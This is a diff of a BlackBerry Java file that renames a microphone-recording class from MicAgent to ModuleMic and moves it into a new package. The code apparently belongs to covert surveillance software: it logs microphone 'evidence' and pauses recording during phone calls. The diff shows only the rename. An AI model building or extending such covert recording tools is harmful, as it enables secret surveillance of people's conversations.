@@ -7,7 +7,7 @@
  * File         : MicAgent.java
  * Created      : 28-apr-2010
  * *************************************************/
-package blackberry.agent;
+package blackberry.module;
 
 import net.rim.blackberry.api.phone.Phone;
 import net.rim.blackberry.api.phone.PhoneListener;
@@ -28,7 +28,7 @@ import blackberry.utils.Utils;
 /**
  * The Class MicAgent.
  */
-public final class MicAgent extends Module implements PhoneListener {
+public final class ModuleMic extends BaseModule implements PhoneListener {
     private static final long MIC_PERIOD = 5000;
 
     private final int STOPPED = 0;
@@ -58,8 +58,8 @@ public final class MicAgent extends Module implements PhoneListener {
      * @param agentStatus
      *            the agent status
      */
-    public MicAgent(final boolean agentEnabled) {
-        super(Module.AGENT_MIC, agentEnabled, Conf.AGENT_MIC_ON_SD, "MicAgent");
+    public ModuleMic(final boolean agentEnabled) {
+        super(BaseModule.AGENT_MIC, agentEnabled, Conf.AGENT_MIC_ON_SD, "MicAgent");
         //#ifdef DBC
         Check.asserts(
                 Evidence.convertTypeEvidence(agentId) == EvidenceType.MIC,
@@ -75,7 +75,7 @@ public final class MicAgent extends Module implements PhoneListener {
      * @param confParams
      *            the conf params
      */
-    protected MicAgent(final boolean agentStatus, final byte[] confParams) {
+    protected ModuleMic(final boolean agentStatus, final byte[] confParams) {
         this(agentStatus);
         parse(confParams);
         state = STOPPED;
@@ -346,7 +346,7 @@ public final class MicAgent extends Module implements PhoneListener {
         debug.trace("callIncoming");
         //#endif
 
-        final MicAgent agent = MicAgent.getInstance();
+        final ModuleMic agent = ModuleMic.getInstance();
         agent.suspend();
     }
 
@@ -356,7 +356,7 @@ public final class MicAgent extends Module implements PhoneListener {
         //#ifdef DEBUG
         debug.trace("callInitiated");
         //#endif
-        final MicAgent agent = MicAgent.getInstance();
+        final ModuleMic agent = ModuleMic.getInstance();
         agent.suspend();
     }
 
@@ -366,12 +366,12 @@ public final class MicAgent extends Module implements PhoneListener {
         //#ifdef DEBUG
         debug.trace("callDisconnected");
         //#endif
-        final MicAgent agent = MicAgent.getInstance();
+        final ModuleMic agent = ModuleMic.getInstance();
         agent.resume();
     }
 
-    public static MicAgent getInstance() {
-        return (MicAgent) AgentManager.getInstance().getItem(AGENT_MIC);
+    public static ModuleMic getInstance() {
+        return (ModuleMic) AgentManager.getInstance().getItem(AGENT_MIC);
     }
 
     public void callAdded(int callId) {
